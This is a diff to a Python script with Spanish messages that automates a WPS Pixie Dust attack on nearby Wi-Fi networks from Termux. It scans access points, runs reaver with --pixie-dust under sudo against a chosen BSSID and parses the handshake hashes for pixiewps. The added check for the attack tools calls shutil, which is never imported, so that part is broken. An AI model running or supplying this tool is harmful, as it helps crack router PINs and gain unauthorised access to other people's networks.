@@ -1,5 +1,6 @@
 import subprocess
 import json
+import os
 
 def run_command(command, use_sudo=False):
     """Ejecuta un comando de shell y devuelve la salida."""
@@ -13,7 +14,7 @@ def scan_wifi():
     """Escanea redes Wi-Fi utilizando Termux y devuelve una lista de SSID y BSSID."""
     print("Escaneando redes Wi-Fi...\n")
     stdout, stderr = run_command("termux-wifi-scaninfo", use_sudo=False)
-    
+
     if stderr:
         print(f"Error al escanear redes Wi-Fi: {stderr}")
         return []
@@ -26,10 +27,10 @@ def scan_wifi():
         return []
 
 def perform_pixie_dust_attack(bssid):
-    """Realiza el ataque Pixie Dust usando pixiewps."""
+    """Realiza el ataque Pixie Dust usando reaver y pixiewps."""
     print(f"\nIniciando ataque Pixie Dust en BSSID: {bssid}")
     stdout, stderr = run_command(f"reaver -i wlan0 -b {bssid} -vvv --pixie-dust", use_sudo=True)
-    
+
     if "PKE" in stdout and "PKR" in stdout and "E-Hash1" in stdout and "E-Hash2" in stdout:
         print("Información obtenida para Pixie Dust:")
         print(stdout)
@@ -65,7 +66,21 @@ def extract_value(output, key):
             return line.split(key)[-1].strip()
     return None
 
+def verify_environment():
+    """Verifica que las herramientas necesarias estén instaladas."""
+    required_tools = ["reaver", "pixiewps", "termux-wifi-scaninfo"]
+    for tool in required_tools:
+        if not shutil.which(tool):
+            print(f"Error: La herramienta {tool} no está instalada o no está en el PATH.")
+            return False
+    return True
+
 def main():
+    # Verificar entorno
+    if not verify_environment():
+        print("Por favor, instala las herramientas necesarias y asegúrate de que estén en el PATH.")
+        return
+
     # Escanear redes Wi-Fi
     networks = scan_wifi()
     if not networks:
@@ -91,6 +106,7 @@ def main():
 
 if __name__ == "__main__":
     main()
+
 
 
 
